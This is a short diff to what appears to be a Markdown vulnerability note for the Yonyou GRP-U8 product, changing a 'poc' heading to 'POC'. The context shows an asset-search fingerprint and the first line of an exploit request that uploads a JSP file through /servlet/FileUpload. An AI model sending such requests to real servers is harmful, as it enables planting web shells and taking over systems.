@@ -8,7 +8,7 @@
 app="用友-GRP-U8"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /servlet/FileUpload?fileName=t.jsp&actionID=update HTTP/1.1
